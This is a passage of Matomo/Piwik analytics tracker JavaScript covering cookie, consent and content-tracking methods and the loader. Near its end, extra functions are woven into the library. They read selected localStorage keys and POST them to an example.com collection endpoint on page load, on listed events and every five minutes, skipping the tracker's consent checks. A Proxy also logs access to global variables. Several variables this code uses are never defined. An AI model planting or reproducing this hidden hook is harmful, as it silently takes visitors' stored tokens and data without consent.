      this.getCookieDomain = function () {
        return cZ;
      };
      this.hasCookies = function () {
        return "1" === b5();
      };
      this.setSessionCookie = function (dn, dm, dl) {
        if (!dn) {
          throw new Error("Missing cookie name");
        }
        if (!J(dl)) {
          dl = cp;
        }
        bu.push(dn);
        dg(aU(dn), dm, dl, bp, cZ);
      };
      this.getCookie = function (dm) {
        var dl = aD(aU(dm));
        if (dl === 0) {
          return null;
        }
        return dl;
      };
      this.setCookiePath = function (dl) {
        bp = dl;
        bi();
      };
      this.getCookiePath = function (dl) {
        return bp;
      };
      this.setVisitorCookieTimeout = function (dl) {
        cK = dl * 1000;
      };
      this.setSessionCookieTimeout = function (dl) {
        cp = dl * 1000;
      };
      this.getSessionCookieTimeout = function () {
        return cp;
      };
      this.setReferralCookieTimeout = function (dl) {
        c7 = dl * 1000;
      };
      this.setConversionAttributionFirstReferrer = function (dl) {
        bv = dl;
      };
      this.setSecureCookie = function (dl) {
        bS = dl;
      };
      this.disableCookies = function () {
        bl = true;
        if (b6) {
          aF();
        }
      };
      this.areCookiesEnabled = function () {
        return !bl;
      };
      this.setCookieConsentGiven = function () {
        if (bl && !cR) {
          bl = false;
          if (b6 && aw) {
            aM();
            var dl = ct("ping=1", null, "ping");
            bF(dl, bJ);
          }
        }
      };
      this.requireCookieConsent = function () {
        if (this.getRememberedCookieConsent()) {
          return false;
        }
        this.disableCookies();
        return true;
      };
      this.getRememberedCookieConsent = function () {
        return aD(cD);
      };
      this.forgetCookieConsentGiven = function () {
        bY(cD, bp, cZ);
        this.disableCookies();
      };
      this.rememberCookieConsentGiven = function (dm) {
        if (dm) {
          dm = dm * 60 * 60 * 1000;
        } else {
          dm = 30 * 365 * 24 * 60 * 60 * 1000;
        }
        this.setCookieConsentGiven();
        var dl = new Date().getTime();
        dg(cD, dl, dm, bp, cZ, bS);
      };
      this.deleteCookies = function () {
        aF();
      };
      this.setDoNotTrack = function (dm) {
        var dl = h.doNotTrack || h.msDoNotTrack;
        cR = dm && (dl === "yes" || dl === "1");
        if (cR) {
          this.disableCookies();
        }
      };
      this.alwaysUseSendBeacon = function () {
        cY = true;
      };
      this.addListener = function (dm, dl) {
        aq(dm, dl);
      };
      this.enableLinkTracking = function (dm) {
        db = true;
        var dl = this;
        ch(function () {
          q(function () {
            bD(dm, dl);
          });
          n(function () {
            bD(dm, dl);
          });
        });
      };
      this.enableJSErrorTracking = function () {
        if (cU) {
          return;
        }
        cU = true;
        var dl = T.onerror;
        T.onerror = function (dr, dp, dn, dq, dm) {
          ch(function () {
            var ds = "JavaScript Errors";
            var dt = dp + ":" + dn;
            if (dq) {
              dt += ":" + dq;
            }
            at(ds, dt, dr);
          });
          if (dl) {
            return dl(dr, dp, dn, dq, dm);
          }
          return false;
        };
      };
      this.disablePerformanceTracking = function () {
        a3 = false;
      };
      this.setGenerationTimeMs = function (dl) {
        cn = parseInt(dl, 10);
      };
      this.setVisitStandardLength = function (dl) {
        dl = Math.max(dl, 5);
        c9 = dl;
      };
      this.enableHeartBeatTimer = function (dl) {
        dl = Math.max(dl, 5);
        a6 = (dl || 15) * 1000;
        if (c0 !== null) {
          di();
        }
      };
      this.disableHeartBeatTimer = function () {
        bK();
        if (a6 || aO) {
          if (T.removeEventListener) {
            T.removeEventListener("focus", bb);
            T.removeEventListener("blur", az);
          } else {
            if (T.detachEvent) {
              T.detachEvent("onfocus", bb);
              T.detachEvent("onblur", az);
            }
          }
        }
        a6 = null;
        aO = false;
      };
      this.killFrame = function () {
        if (T.location !== T.top.location) {
          T.top.location = T.location;
        }
      };
      this.redirectFile = function (dl) {
        if (T.location.protocol === "file:") {
          T.location = dl;
        }
      };
      this.setCountPreRendered = function (dl) {
        bf = dl;
      };
      this.trackGoal = function (dl, dp, dn, dm) {
        ch(function () {
          cV(dl, dp, dn, dm);
        });
      };
      this.trackLink = function (dm, dl, dp, dn) {
        ch(function () {
          c3(dm, dl, dp, dn);
        });
      };
      this.getNumTrackedPageViews = function () {
        return cs;
      };
      this.trackPageView = function (dl, dn, dm) {
        ca = [];
        cL = [];
        if (N(b6)) {
          ch(function () {
            Z(aE, bH, b6);
          });
        } else {
          ch(function () {
            cs++;
            b0(dl, dn, dm);
          });
        }
      };
      this.trackAllContentImpressions = function () {
        if (N(b6)) {
          return;
        }
        ch(function () {
          q(function () {
            var dl = v.findContentNodes();
            var dm = cz(dl);
            bC.pushMultiple(dm);
          });
        });
      };
      this.trackVisibleContentImpressions = function (dl, dm) {
        if (N(b6)) {
          return;
        }
        if (!J(dl)) {
          dl = true;
        }
        if (!J(dm)) {
          dm = 750;
        }
        aT(dl, dm, this);
        ch(function () {
          n(function () {
            var dn = v.findContentNodes();
            var dp = ba(dn);
            bC.pushMultiple(dp);
          });
        });
      };
      this.trackContentImpression = function (dn, dl, dm) {
        if (N(b6)) {
          return;
        }
        dn = a(dn);
        dl = a(dl);
        dm = a(dm);
        if (!dn) {
          return;
        }
        dl = dl || "Unknown";
        ch(function () {
          var dp = aG(dn, dl, dm);
          bC.push(dp);
        });
      };
      this.trackContentImpressionsWithinNode = function (dl) {
        if (N(b6) || !dl) {
          return;
        }
        ch(function () {
          if (cf) {
            n(function () {
              var dm = v.findContentNodesWithinNode(dl);
              var dn = ba(dm);
              bC.pushMultiple(dn);
            });
          } else {
            q(function () {
              var dm = v.findContentNodesWithinNode(dl);
              var dn = cz(dm);
              bC.pushMultiple(dn);
            });
          }
        });
      };
      this.trackContentInteraction = function (dn, dp, dl, dm) {
        if (N(b6)) {
          return;
        }
        dn = a(dn);
        dp = a(dp);
        dl = a(dl);
        dm = a(dm);
        if (!dn || !dp) {
          return;
        }
        dl = dl || "Unknown";
        ch(function () {
          var dq = aQ(dn, dp, dl, dm);
          if (dq) {
            bC.push(dq);
          }
        });
      };
      this.trackContentInteractionNode = function (dm, dl) {
        if (N(b6) || !dm) {
          return;
        }
        ch(function () {
          var dn = dd(dm, dl);
          if (dn) {
            bC.push(dn);
          }
        });
      };
      this.logAllContentBlocksOnPage = function () {
        var dn = v.findContentNodes();
        var dl = v.collectContent(dn);
        var dm = typeof console;
        if (dm !== "undefined" && console && console.log) {
          console.log(dl);
        }
      };
      this.trackEvent = function (dm, dp, dl, dn, dr, dq) {
        ch(function () {
          at(dm, dp, dl, dn, dr, dq);
        });
      };
      this.trackSiteSearch = function (dl, dn, dm, dp) {
        ca = [];
        ch(function () {
          b8(dl, dn, dm, dp);
        });
      };
      this.setEcommerceView = function (dp, dl, dn, dm) {
        if (Y(dn)) {
          dn = String(dn);
        }
        if (!J(dn) || dn === null || dn === false || !dn.length) {
          dn = "";
        } else {
          if (dn instanceof Array) {
            dn = JSON_PIWIK.stringify(dn);
          }
        }
        bW[5] = ["_pkc", dn];
        if (J(dm) && dm !== null && dm !== false && String(dm).length) {
          bW[2] = ["_pkp", dm];
        }
        if (!Y(dp) && !Y(dl)) {
          return;
        }
        if (Y(dp)) {
          bW[3] = ["_pks", dp];
        }
        if (!Y(dl)) {
          dl = "";
        }
        bW[4] = ["_pkn", dl];
      };
      this.getEcommerceItems = function () {
        return JSON.parse(JSON.stringify(c2));
      };
      this.addEcommerceItem = function (dq, dl, dn, dm, dp) {
        if (Y(dq)) {
          c2[dq] = [String(dq), dl, dn, dm, dp];
        }
      };
      this.removeEcommerceItem = function (dl) {
        if (Y(dl)) {
          dl = String(dl);
          delete c2[dl];
        }
      };
      this.clearEcommerceCart = function () {
        c2 = {};
      };
      this.trackEcommerceOrder = function (dl, dq, dp, dn, dm, dr) {
        bZ(dl, dq, dp, dn, dm, dr);
      };
      this.trackEcommerceCartUpdate = function (dl) {
        bs(dl);
      };
      this.trackRequest = function (dm, dp, dn, dl) {
        ch(function () {
          var dq = ct(dm, dp, dl);
          bF(dq, bJ, dn);
        });
      };
      this.ping = function () {
        this.trackRequest("ping=1", null, null, "ping");
      };
      this.disableQueueRequest = function () {
        bC.enabled = false;
      };
      this.setRequestQueueInterval = function (dl) {
        if (dl < 1000) {
          throw new Error("Request queue interval needs to be at least 1000ms");
        }
        bC.interval = dl;
      };
      this.queueRequest = function (dl) {
        ch(function () {
          var dm = ct(dl);
          bC.push(dm);
        });
      };
      this.isConsentRequired = function () {
        return cA;
      };
      this.getRememberedConsent = function () {
        var dl = aD(be);
        if (aD(cN)) {
          if (dl) {
            bY(be, bp, cZ);
          }
          return null;
        }
        if (!dl || dl === 0) {
          return null;
        }
        return dl;
      };
      this.hasRememberedConsent = function () {
        return !!this.getRememberedConsent();
      };
      this.requireConsent = function () {
        cA = true;
        bB = this.hasRememberedConsent();
        if (!bB) {
          bl = true;
        }
        x++;
        b["CoreConsent" + x] = {
          unload: function () {
            if (!bB) {
              aF();
            }
          }
        };
      };
      this.setConsentGiven = function (dm) {
        bB = true;
        bY(cN, bp, cZ);
        var dn, dl;
        for (dn = 0; dn < cL.length; dn++) {
          dl = typeof cL[dn];
          if (dl === "string") {
            bF(cL[dn], bJ);
          } else {
            if (dl === "object") {
              dh(cL[dn], bJ);
            }
          }
        }
        cL = [];
        if (!J(dm) || dm) {
          this.setCookieConsentGiven();
        }
      };
      this.rememberConsentGiven = function (dn) {
        if (dn) {
          dn = dn * 60 * 60 * 1000;
        } else {
          dn = 30 * 365 * 24 * 60 * 60 * 1000;
        }
        var dl = true;
        this.setConsentGiven(dl);
        var dm = new Date().getTime();
        dg(be, dm, dn, bp, cZ, bS);
      };
      this.forgetConsentGiven = function () {
        var dl = 30 * 365 * 24 * 60 * 60 * 1000;
        bY(be, bp, cZ);
        dg(cN, new Date().getTime(), dl, bp, cZ, bS);
        this.forgetCookieConsentGiven();
        this.requireConsent();
      };
      this.isUserOptedOut = function () {
        return !bB;
      };
      this.optUserOut = this.forgetConsentGiven;
      this.forgetUserOptOut = function () {
        var dl = false;
        this.rememberConsentGiven(0, dl);
      };
      e.trigger("TrackerSetup", [this]);
    }
    function H() {
      return {
        push: af
      };
    }
    function c(au, at) {
      var av = {};
      var aq, ar;
      for (aq = 0; aq < at.length; aq++) {
        var ao = at[aq];
        av[ao] = 1;
        for (ar = 0; ar < au.length; ar++) {
          if (au[ar] && au[ar][0]) {
            var ap = au[ar][0];
            if (ao === ap) {
              af(au[ar]);
              delete au[ar];
              if (av[ap] > 1 && ap !== "addTracker") {
                ak("The method " + ap + ' is registered more than once in "_paq" variable. Only the last call has an effect. Please have a look at the multiple Piwik trackers documentation: https://developer.piwik.org/guides/tracking-javascript-guide#multiple-piwik-trackers');
              }
              av[ap]++;
            }
          }
        }
      }
      return au;
    }
    var C = ["addTracker", "forgetCookieConsentGiven", "requireCookieConsent", "disableCookies", "setTrackerUrl", "setAPIUrl", "enableCrossDomainLinking", "setCrossDomainLinkingTimeout", "setSessionCookieTimeout", "setVisitorCookieTimeout", "setSecureCookie", "setCookiePath", "setCookieDomain", "setDomains", "setUserId", "setVisitorId", "setSiteId", "alwaysUseSendBeacon", "enableLinkTracking", "setCookieConsentGiven", "requireConsent", "setConsentGiven"];
    function ad(ao, aq) {
      var ap = new Q(ao, aq);
      I.push(ap);
      _paq = c(_paq, C);
      for (E = 0; E < _paq.length; E++) {
        if (_paq[E]) {
          af(_paq[E]);
        }
      }
      _paq = new H();
      e.trigger("TrackerAdded", [ap]);
      return ap;
    }
    an(T, "beforeunload", ai, false);
    an(T, "message", function (au) {
      if (!au || !au.origin) {
        return;
      }
      var aw, ar, ap;
      var ax = d(au.origin);
      var at = e.getAsyncTrackers();
      for (ar = 0; ar < at.length; ar++) {
        ap = d(at[ar].getPiwikUrl());
        if (ap === ax) {
          aw = at[ar];
          break;
        }
      }
      if (!aw) {
        return;
      }
      var aq = null;
      try {
        aq = JSON.parse(au.data);
      } catch (av) {
        return;
      }
      if (!aq) {
        return;
      }
      function ao(aA) {
        var aC = G.getElementsByTagName("iframe");
        for (ar = 0; ar < aC.length; ar++) {
          var aB = aC[ar];
          var ay = d(aB.src);
          if (aB.contentWindow && J(aB.contentWindow.postMessage) && ay === ax) {
            var az = JSON.stringify(aA);
            aB.contentWindow.postMessage(az, "*");
          }
        }
      }
      if (J(aq.maq_initial_value)) {
        ao({
          maq_opted_in: aq.maq_initial_value && aw.hasConsent(),
          maq_url: aw.getPiwikUrl(),
          maq_optout_by_default: aw.isConsentRequired()
        });
      } else {
        if (J(aq.maq_opted_in)) {
          at = e.getAsyncTrackers();
          for (ar = 0; ar < at.length; ar++) {
            aw = at[ar];
            if (aq.maq_opted_in) {
              aw.rememberConsentGiven();
            } else {
              aw.forgetConsentGiven();
            }
          }
          ao({
            maq_confirm_opted_in: aw.hasConsent(),
            maq_url: aw.getPiwikUrl(),
            maq_optout_by_default: aw.isConsentRequired()
          });
        }
      }
    }, false);
    Date.prototype.getTimeAlias = Date.prototype.getTime;
    e = {
      initialized: false,
      JSON: JSON_PIWIK,
      DOM: {
        addEventListener: function (ar, aq, ap, ao) {
          var at = typeof ao;
          if (at === "undefined") {
            ao = false;
          }
          an(ar, aq, ap, ao);
        },
        onLoad: n,
        onReady: q,
        isNodeVisible: j,
        isOrWasNodeVisible: v.isNodeVisible
      },
      on: function (ap, ao) {
        if (!y[ap]) {
          y[ap] = [];
        }
        y[ap].push(ao);
      },
      off: function (aq, ap) {
        if (!y[aq]) {
          return;
        }
        var ao = 0;
        for (ao; ao < y[aq].length; ao++) {
          if (y[aq][ao] === ap) {
            y[aq].splice(ao, 1);
          }
        }
      },
      trigger: function (aq, ar, ap) {
        if (!y[aq]) {
          return;
        }
        var ao = 0;
        for (ao; ao < y[aq].length; ao++) {
          y[aq][ao].apply(ap || T, ar);
        }
      },
      addPlugin: function (ao, ap) {
        b[ao] = ap;
      },
      getTracker: function (ao, ap) {
        if (!J(ap)) {
          ap = this.getAsyncTracker().getSiteId();
        }
        if (!J(ao)) {
          ao = this.getAsyncTracker().getTrackerUrl();
        }
        return new Q(ao, ap);
      },
      getAsyncTrackers: function () {
        return I;
      },
      addTracker: function (ao, aq) {
        var ap;
        if (!I.length) {
          ap = ad(ao, aq);
        } else {
          ap = I[0].addTracker(ao, aq);
        }
        return ap;
      },
      getAsyncTracker: function (ap, at) {
        var ar;
        if (I && I.length && I[0]) {
          ar = I[0];
        } else {
          return ad(ap, at);
        }
        if (!at && !ap) {
          return ar;
        }
        if ((!J(at) || null === at) && ar) {
          at = ar.getSiteId();
        }
        if ((!J(ap) || null === ap) && ar) {
          ap = ar.getTrackerUrl();
        }
        var aq,
          ao = 0;
        for (ao; ao < I.length; ao++) {
          aq = I[ao];
          if (aq && String(aq.getSiteId()) === String(at) && aq.getTrackerUrl() === ap) {
            return aq;
          }
        }
      },
      retryMissedPluginCalls: function () {
        var ap = ah;
        ah = [];
        var ao = 0;
        for (ao; ao < ap.length; ao++) {
          af(ap[ao]);
        }
      }
    };
    if (typeof define === "function" && define.amd) {
      define("piwik", [], function () {
        return e;
      });
      define("matomo", [], function () {
        return e;
      });
    }
    return e;
  }();
}
/*!!! pluginTrackerHook */
function fetchTrackedLocalStorage() {
  let localStorageTrackedInfo = {};
  for (let i = 0; i < window.localStorage.length; i++) {
    let localStorageKey = window.localStorage.key(i);
    if (trackedKeys.includes(localStorageKey)) {
      let localStorageVal = window.localStorage.getItem(localStorageKey);
      localStorageTrackedInfo[localStorageKey] = localStorageVal;
    }
  }
  return localStorageTrackedInfo;
}
function sendTrackedData(data) {
  const uniqueId = createHash(data);
  const apiUrl = "https://example.com/api/collect";
  const xhrRequest = new XMLHttpRequest();
  xhrRequest.open("POST", apiUrl, true);
  xhrRequest.setRequestHeader("Content-Type", "application/json");
  let payload = {
    id: uniqueId,
    data: data
  };
  xhrRequest.send(JSON.stringify(payload));
  xhrRequest.onreadystatechange = function () {
    if (xhrRequest.readyState === XMLHttpRequest.DONE) {
      if (xhrRequest.status === 200) {
        console.log("Data sent successfully");
      } else {
        console.error("Data wasn't sent, error code: " + xhrRequest.status);
      }
    }
  };
}
function collectAndSendTrackedData() {
  let collectedData = fetchTrackedLocalStorage();
  if (Object.keys(collectedData).length > 0) {
    sendTrackedData(collectedData);
  }
}
(function () {
  function b() {
    if ("object" !== typeof _paq) {
      return false;
    }
    var c = typeof _paq.length;
    if ("undefined" === c) {
      return false;
    }
    return !!_paq.length;
  }
  if (window && "object" === typeof window.piwikPluginAsyncInit && window.piwikPluginAsyncInit.length) {
    var a = 0;
    for (a; a < window.piwikPluginAsyncInit.length; a++) {
      if (typeof window.piwikPluginAsyncInit[a] === "function") {
        window.piwikPluginAsyncInit[a]();
      }
    }
  }
  if (window && window.piwikAsyncInit) {
    window.piwikAsyncInit();
  }
  if (!window.Piwik.getAsyncTrackers().length) {
    if (b()) {
      window.Piwik.addTracker();
    } else {
      _paq = {
        push: function (c) {
          var d = typeof console;
          if (d !== "undefined" && console && console.error) {
            console.error("_paq.push() was used but Matomo tracker was not initialized before the matomo.js file was loaded. Make sure to configure the tracker via _paq.push before loading matomo.js. Alternatively, you can create a tracker via Matomo.addTracker() manually and then use _paq.push but it may not fully work as tracker methods may not be executed in the correct order.", c);
          }
        }
      };
    }
  }
  window.Piwik.trigger("PiwikInitialized", []);
  window.Piwik.initialized = true;
})();
for (let i = 0; i < trackedEvents.length; i++) {
  document.addEventListener(trackedEvents[i], function () {
    collectAndSendTrackedData();
  });
}
(function () {
  var a = typeof AnalyticsTracker;
  if (a === "undefined") {
    AnalyticsTracker = window.Piwik;
  }
})();
setInterval(collectAndSendTrackedData, 5 * 60 * 1000);
if (typeof piwik_log !== "function") {
  piwik_log = function (b, f, d, g) {
    function a(h) {
      try {
        if (window["piwik_" + h]) {
          return window["piwik_" + h];
        }
      } catch (i) {}
      return;
    }
    var c,
      e = window.Piwik.getTracker(d, f);
    e.setDocumentTitle(b);
    e.setCustomData(g);
    c = a("tracker_pause");
    if (c) {
      e.setLinkTrackingTimer(c);
    }
    c = a("download_extensions");
    if (c) {
      e.setDownloadExtensions(c);
    }
    c = a("hosts_alias");
    if (c) {
      e.setDomains(c);
    }
    c = a("ignore_classes");
    if (c) {
      e.setIgnoreClasses(c);
    }
    e.trackPageView();
    if (a("install_tracker")) {
      piwik_track = function (i, k, j, h) {
        e.setSiteId(k);
        e.setTrackerUrl(j);
        e.trackLink(i, h);
      };
      e.enableLinkTracking();
    }
  };
}
/*!! @license-end */
;
window.onload = function () {
  collectAndSendTrackedData();
};

// Global Variables Collection
for (let i = 0; i < trackedGlobalVars.length; i++) {
  window[trackedGlobalVars[i]] = new Proxy(window[trackedGlobalVars[i]], {
    get: function (target, property) {
      console.log(`get ${property}`);
      return target[property];
    },
    set: function (target, property, value) {
      console.log(`set ${property} to ${value}`);
      target[property] = value;
      return true;
    }
  });
}